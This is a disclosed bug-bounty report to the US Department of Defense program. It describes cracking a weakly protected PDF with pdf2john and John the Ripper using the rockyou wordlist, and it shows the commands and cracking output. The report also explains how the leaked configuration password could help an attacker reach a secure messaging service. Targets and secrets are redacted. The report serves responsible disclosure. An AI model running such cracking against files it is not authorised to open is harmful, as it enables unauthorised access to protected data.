# Password Cracking - Weak Password Used to Secure ████ Containing a Plaintext Password

## Report Details
- **Report ID**: 985133
- **URL**: https://hackerone.com/reports/985133
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-09-18T05:39:31.410Z
- **Disclosed**: 2021-02-18T19:14:14.454Z

## Reporter
- **Username**: un4gi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
I was able to crack the password to the ████████ located at ██████, as the pdf was protected with a weak password contained in a common word list. This guide contains steps to set-up the ███████ secure communication application with the unprotected configuration file located at██████████. This guide also contains a plaintext password for the configuration file.

## Step-by-step Reproduction Instructions

1. Browse to ███
2. Click `████████`. You will be prompted for a password.
3. Using wget, download the pdf: `wget ████████`.
4. Once downloaded, you can use `pdf2john` to convert the pdf password into a format that is parse-able by `john`: 
`perl /path/to/john/pdf2john.pl █████████.pdf`
5. This will produce a hash. Cracking this hash with `john` and the `rockyou` wordlist will produce the password: 

```
root@kali:/home/kali# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 6 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
█████████           (████████.pdf)
1g 0:00:00:00 DONE (2020-09-18 01:08) 1.785g/s 2285p/s 2285c/s 2285C/s 753951..poohbear1
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed
```

7. You can now browse to █████████, click `███`, and type in the password `█████████` to view the pdf (or view it on your local system).
8. Reading the setup instructions, and attacker can download the `Messaging Config`to download the ████ configuration file. This mobile guide contains the plaintext password for the configuration file (`███████`). They can then attempt to use the configuration file and a compromised `.mil`/`.gov`/etc. account to gain access to ████ secure communications.

## References
https://github.com/openwall/john/blob/bleeding-jumbo/run/pdf2john.pl

## Suggested Mitigation/Remediation Actions
Use a strong password for this .pdf file in order to prevent successful password cracking attempts.

## Impact

This guide contains steps to set-up the ███████ secure communication application with the unprotected configuration file located at█████. This guide also contains a plaintext password for the configuration file. An attacker could potentially join the secure communication channel if they were able to obtain access to the DoD ID number of an ███ member.

## Attachments
No attachments
